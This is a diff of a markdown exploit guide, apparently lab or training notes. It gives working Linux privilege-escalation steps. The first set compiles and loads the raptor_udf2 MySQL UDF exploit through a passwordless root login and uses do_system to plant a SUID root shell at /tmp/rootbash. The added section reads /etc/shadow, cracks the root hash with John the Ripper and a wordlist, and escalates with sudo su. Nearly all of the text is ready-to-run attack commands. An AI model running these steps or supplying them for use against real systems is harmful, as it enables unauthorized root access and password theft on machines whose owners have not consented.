@@ -1,75 +1,112 @@
 
 
-# SQL Exploit
 ---
 
-- **Change into the MySQL directory:**
-
-    ```bash
-    cd /home/user/tools/mysql-udf
-    ```
-
+# 💻 <span style="color:#1E90FF">**SQL Exploit Guide**</span>
 ---
 
-- **Compile the `raptor_udf2.c` exploit code:**
+###  **Change into the MySQL Directory:**
 
-    ```bash
-    gcc -g -c raptor_udf2.c -fPIC
-    gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
-    ```
+```bash
+cd /home/user/tools/mysql-udf
+```
 
 ---
 
-- **Connect to the MySQL service as the root user with a blank password:**
+###  **Compile the `raptor_udf2.c` Exploit Code:**
 
-    ```bash
-    mysql -u root
-    ```
-
----
-
-- **In the MySQL shell, create a User Defined Function (UDF) "do_system" using the compiled exploit:**
-
-    ```sql
-    use mysql;
-    create table foo(line blob);
-    insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
-    select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
-    create function do_system returns integer soname 'raptor_udf2.so';
-    ```
+```bash
+gcc -g -c raptor_udf2.c -fPIC
+gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+```
 
 ---
 
-- **Use the function to copy `/bin/bash` to `/tmp/rootbash` and set the SUID permission:**
+###  **Connect to the MySQL Service as the Root User (No Password):**
 
-    ```sql
-    select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
-    ```
-
----
-
-- **Exit from the MySQL shell:**
-
-    ```bash
-    exit
-    ```
+```bash
+mysql -u root
+```
 
 ---
 
-- **Run the `/tmp/rootbash` executable with `-p` to gain a shell running with root privileges:**
+###  **Create a User Defined Function (UDF) "do_system" Using the Compiled Exploit:**
 
-    ```bash
-    /tmp/rootbash -p
-    ```
+```sql
+use mysql;
+create table foo(line blob);
+insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
+select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
+create function do_system returns integer soname 'raptor_udf2.so';
+```
 
 ---
 
-- **If you want to exit from root:**
+###  **Copy `/bin/bash` to `/tmp/rootbash` and Set the SUID Permission:**
 
-    ```bash
-    rm /tmp/rootbash
-    exit
-    ```
+```sql
+select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
+```
+
+---
+
+###  **Exit from the MySQL Shell:**
+
+```bash
+exit
+```
+
+---
+
+###  **Run `/tmp/rootbash` with Root Privileges:**
+
+```bash
+/tmp/rootbash -p
+```
+
+---
+
+###  **Clean Up and Exit from Root:**
+
+```bash
+rm /tmp/rootbash
+exit
+```
+
+---
+
+# 🛡️ <span style="color:#32CD32">**Weak File Permissions**</span>
+---
+
+## **Check the Permissions of the `shadow` File**
+
+```bash
+ls -l /etc/shadow
+```
+
+---
+
+## **Show the Hash of the Root Password**
+
+```bash
+cat /etc/shadow
+```
+
+---
+
+## **Crack the Hash with John the Ripper (Dictionary Attack)**
+
+```bash
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+```
+
+---
+
+## **Privilege Escalation**
+
+```bash
+sudo su
+```
 
 ---
 
